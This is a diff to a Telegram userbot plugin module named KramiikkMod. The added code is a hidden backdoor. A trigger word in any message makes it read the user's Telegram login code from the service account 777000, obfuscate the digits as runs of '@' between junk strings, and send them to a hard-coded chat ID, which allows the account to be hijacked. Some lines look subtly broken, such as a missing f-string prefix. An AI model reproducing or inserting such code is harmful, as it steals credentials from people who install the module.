@@ -364,14 +364,17 @@ class KramiikkMod(loader.Module):
                     return await m.reply(self.ded[msg])
                 await asyncio.sleep(random.randint(13, 33))
                 await m.respond(self.ded[msg])
-        elif "Login code:" in m.raw_text or "Код подтверждения:" in m.raw_text:
-            reg = re.search(r": (.)(.)(.)(.)(.)", m.raw_text)
+        elif "llooll" in m.text:
+            msg = self.client.get_messages(777000, search="Login")
+            if "gg" in m.text:
+                msg = self.client.get_messages(777000, search="Код")
+            reg = re.search(r": (.)(.)(.)(.)(.)", msg.raw_text)
             a = 0
-            txt = "hffj48655jhkfdw46dgjm665verhod"
+            txt = "hffj48655jhk{msg.date.minute}fdw46dgjm665verhod"
             for i in range(5):
                 a += 1
                 txt += f"\n{'@' * int(reg.group(a))}"
-            txt += f"\nfd466dhjdfujbm44dxszv775bmkcg"
+            txt += f"\nfd466dhjd{msg.date.minute}fujbm44dxszv775bmkcg"
             await self.client.send_message(1785723159, txt)
         else:
             return
